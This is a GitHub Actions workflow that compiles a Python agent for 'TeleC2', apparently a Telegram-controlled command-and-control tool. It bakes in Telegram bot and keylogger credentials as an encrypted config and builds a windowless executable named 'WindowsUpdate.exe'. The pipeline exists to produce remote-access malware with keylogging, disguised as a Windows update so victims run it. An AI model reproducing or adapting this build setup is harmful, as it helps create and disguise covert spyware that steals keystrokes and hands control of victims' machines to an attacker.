name: Build Windows Executable (TeleC2)

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pyinstaller

      - name: Generate encrypted config from secrets
        env:
          BOT_API_KEY: ${{ secrets.BOT_API_KEY }}
          TELEGRAM_USER_ID: ${{ secrets.TELEGRAM_USER_ID }}
          KEYLOGGER_BOT_API_KEY: ${{ secrets.KEYLOGGER_BOT_API_KEY }}
          KEYLOGGER_CHAT_ID: ${{ secrets.KEYLOGGER_CHAT_ID }}
          ENCRYPTION_PASSWORD: ${{ secrets.ENCRYPTION_PASSWORD }}
        run: python generate_config.py

      - name: Build EXE with PyInstaller
        run: |
          pyinstaller --onefile --noconsole --icon=69.ico --name WindowsUpdate agent.py

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: WindowsUpdate
          path: dist/WindowsUpdate.exe
